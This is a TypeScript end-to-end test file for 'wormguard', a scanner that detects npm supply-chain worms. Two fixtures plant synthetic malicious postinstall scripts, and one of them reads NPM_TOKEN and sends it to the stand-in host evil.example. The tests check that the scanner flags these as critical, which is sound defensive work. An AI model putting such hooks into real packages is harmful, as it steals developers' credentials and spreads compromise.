// SPDX-License-Identifier: MIT
// End-to-end CLI tests against real `npm install` of small fixture projects.
// We only run these when network is available (registry.npmjs.org reachable);
// they're a soft-fail (skipped) when offline so CI still passes for offline
// developers.
import { describe, expect, test } from "bun:test";
import { mkdtempSync, rmSync, writeFileSync, mkdirSync } from "node:fs";
import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { join } from "node:path";

const dec = new TextDecoder();
function spawn(cmd: string, args: string[], cwd: string): { code: number; out: string } {
  const p = spawnSync(cmd, args, { cwd, encoding: "buffer" });
  return {
    code: p.status ?? -1,
    out: dec.decode(p.stdout) + dec.decode(p.stderr),
  };
}

function networkOk(): boolean {
  try {
    const r = spawnSync("curl", ["-sSf", "-m", "3", "-o", "/dev/null", "https://registry.npmjs.org/"]);
    return r.status === 0;
  } catch {
    return false;
  }
}

const HAS_NETWORK = networkOk();
const wormguard = join(process.cwd(), "src", "cli.ts");

describe("end-to-end CLI vs real npm install", () => {
  if (!HAS_NETWORK) {
    test("skipped (no network)", () => {
      expect(true).toBe(true);
    });
    return;
  }

  test("clean fixture (lodash only): scan exits 0 under --ci", () => {
    const dir = mkdtempSync(join(tmpdir(), "wg-e2e-clean-"));
    try {
      writeFileSync(
        join(dir, "package.json"),
        JSON.stringify({
          name: "wg-e2e-clean",
          version: "1.0.0",
          private: true,
          dependencies: { lodash: "4.17.21" },
        }),
      );
      const inst = spawn("npm", ["install", "--no-audit", "--no-fund", "--ignore-scripts", "--prefer-offline"], dir);
      expect(inst.code).toBe(0);
      const r = spawn("bun", [wormguard, "scan", dir, "--ci"], process.cwd());
      // Lodash has no install scripts, no IoC match, no typosquat; should be clean.
      expect(r.code).toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }, 60_000);

  test("malicious-shaped synthetic package on top of a real install: scan flags critical", () => {
    const dir = mkdtempSync(join(tmpdir(), "wg-e2e-malic-"));
    try {
      writeFileSync(
        join(dir, "package.json"),
        JSON.stringify({
          name: "wg-e2e-malic",
          version: "1.0.0",
          private: true,
          dependencies: { lodash: "4.17.21" },
        }),
      );
      spawn("npm", ["install", "--no-audit", "--no-fund", "--ignore-scripts", "--prefer-offline"], dir);
      // Drop a synthetic worm-shaped package directly into node_modules.
      const evilDir = join(dir, "node_modules", "evil-x");
      mkdirSync(evilDir, { recursive: true });
      writeFileSync(
        join(evilDir, "package.json"),
        JSON.stringify({
          name: "evil-x",
          version: "1.0.0",
          scripts: {
            postinstall:
              `node -e "const t=process.env.NPM_TOKEN;require('https').request({host:'evil.example',path:'/'+t}).end()"`,
          },
        }),
      );
      const r = spawn("bun", [wormguard, "scan", dir, "--json"], process.cwd());
      const parsed = JSON.parse(r.out) as { findings: { ruleId: string; severity: string; pkg: string }[] };
      const evilFindings = parsed.findings.filter((f) => f.pkg === "evil-x");
      expect(evilFindings.some((f) => f.ruleId === "WG-AST-NETWORK-BUILTIN" && f.severity === "critical")).toBe(true);
      const ci = spawn("bun", [wormguard, "scan", dir, "--ci"], process.cwd());
      expect(ci.code).toBe(1);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }, 60_000);

  test("snapshot then audit: identical state ⇒ exit 0", () => {
    const dir = mkdtempSync(join(tmpdir(), "wg-e2e-audit-"));
    try {
      writeFileSync(
        join(dir, "package.json"),
        JSON.stringify({ name: "wg-e2e-audit", version: "1.0.0", private: true, dependencies: { lodash: "4.17.21" } }),
      );
      spawn("npm", ["install", "--no-audit", "--no-fund", "--ignore-scripts", "--prefer-offline"], dir);
      const snap = spawn("bun", [wormguard, "snapshot", dir], process.cwd());
      expect(snap.code).toBe(0);
      const aud = spawn("bun", [wormguard, "audit", dir, "--ci"], process.cwd());
      expect(aud.code).toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }, 60_000);

  test("snapshot then audit: synthetic body change ⇒ WG-DIFF-SCRIPT-BODY critical", () => {
    const dir = mkdtempSync(join(tmpdir(), "wg-e2e-bodydiff-"));
    try {
      writeFileSync(
        join(dir, "package.json"),
        JSON.stringify({ name: "wg-e2e-bodydiff", version: "1.0.0", private: true, dependencies: { lodash: "4.17.21" } }),
      );
      spawn("npm", ["install", "--no-audit", "--no-fund", "--ignore-scripts", "--prefer-offline"], dir);
      const evilDir = join(dir, "node_modules", "victim");
      mkdirSync(evilDir, { recursive: true });
      writeFileSync(
        join(evilDir, "package.json"),
        JSON.stringify({ name: "victim", version: "1.0.0", scripts: { postinstall: "echo legit" } }),
      );
      // Add to lockfile fingerprint so baseline knows about it.
      const lockPath = join(dir, "package-lock.json");
      const lock = JSON.parse(require("node:fs").readFileSync(lockPath, "utf8")) as { packages: Record<string, unknown> };
      lock.packages["node_modules/victim"] = {
        version: "1.0.0",
        resolved: "https://registry.npmjs.org/victim/-/victim-1.0.0.tgz",
        integrity: "sha512-AAA",
        hasInstallScript: true,
      };
      writeFileSync(lockPath, JSON.stringify(lock, null, 2));
      const snap = spawn("bun", [wormguard, "snapshot", dir], process.cwd());
      expect(snap.code).toBe(0);
      // Now mutate the body in place (worm-injection scenario).
      writeFileSync(
        join(evilDir, "package.json"),
        JSON.stringify({
          name: "victim",
          version: "1.0.0",
          scripts: { postinstall: "node -e \"require('https').request('https://evil')\"" },
        }),
      );
      const aud = spawn("bun", [wormguard, "audit", dir, "--json"], process.cwd());
      const parsed = JSON.parse(aud.out) as { findings: { ruleId: string; severity: string }[] };
      expect(parsed.findings.some((f) => f.ruleId === "WG-DIFF-SCRIPT-BODY" && f.severity === "critical")).toBe(true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }, 60_000);
});
